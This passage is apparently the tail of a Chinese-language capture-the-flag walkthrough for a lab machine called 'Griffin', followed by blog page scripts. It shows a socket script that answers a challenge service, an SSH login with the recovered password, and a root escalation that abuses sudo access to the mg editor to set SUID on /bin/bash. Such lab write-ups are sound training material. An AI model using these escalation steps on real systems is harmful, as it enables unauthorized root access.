+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>((<span class="pl-s1">md5_hash</span> <span class="pl-c1">+</span> <span class="pl-s">"<span class="pl-cce">\n</span>"</span>).<span class="pl-c1">encode</span>())
+
+<span class="pl-en">print</span>(<span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>())
+<span class="pl-s1">s</span>.<span class="pl-c1">close</span>()</pre></div>
+<p>成功通过所有挑战后，服务返回了一个密码。</p>
+<pre class="notranslate"><code class="notranslate">Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
+</code></pre>
+<p>这个密码<code class="notranslate">Wow!VeryFuuuuuny!</code>实际上是<code class="notranslate">peter</code>用户的SSH密码。使用该密码成功登录<code class="notranslate">peter</code>账户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh peter@192.168.205.132
+peter@192.168.205.132<span class="pl-s"><span class="pl-pds">'</span>s password: Wow!VeryFuuuuuny!</span>
+<span class="pl-s">...</span>
+<span class="pl-s">peter@Griffin:~$ id</span>
+<span class="pl-s">uid=1003(peter) gid=1003(peter) groups=1003(peter)</span></pre></div>
+<h2><strong>3.5 Sudo提权 (peter -&gt; root)</strong></h2>
+<p>最后，检查<code class="notranslate">peter</code>用户的sudo权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ sudo -l
+...
+User peter may run the following commands on Griffin:
+    (ALL) NOPASSWD: /usr/bin/mg</pre></div>
+<p><code class="notranslate">peter</code>可以免密以root权限运行文本编辑器<code class="notranslate">mg</code>。<code class="notranslate">mg</code>编辑器可以通过执行外部shell命令来进行提权。</p>
+<ol>
+<li>
+<p>创建一个脚本<code class="notranslate">/tmp/a</code>，内容为给<code class="notranslate">/bin/bash</code>添加SUID权限位，并赋予其执行权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/a
+peter@Griffin:<span class="pl-k">~</span>$ chmod +x /tmp/a</pre></div>
+</li>
+<li>
+<p>以sudo权限运行<code class="notranslate">mg</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ sudo /usr/bin/mg</pre></div>
+</li>
+<li>
+<p>在<code class="notranslate">mg</code>编辑器中，按<code class="notranslate">Alt-x</code>，输入<code class="notranslate">shell-command</code>并按回车。</p>
+</li>
+<li>
+<p>在新的提示符下，输入<code class="notranslate">/tmp/a</code>并回车，执行我们的脚本。</p>
+</li>
+<li>
+<p>按<code class="notranslate">Ctrl-x</code> <code class="notranslate">Ctrl-c</code>退出<code class="notranslate">mg</code>编辑器。</p>
+</li>
+</ol>
+<p>此时，<code class="notranslate">/bin/bash</code>已被设置了SUID位。使用<code class="notranslate">-p</code>参数运行bash以保留有效用户ID（euid）。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ bash -p
+bash-5.0# id
+uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)</pre></div>
+<p>成功获得root权限。读取最终的flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# cat /root/root.txt /home/lois/user.txt
+flag{root-be93b7d7f0a30d5159c0460874e6e015}
+flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
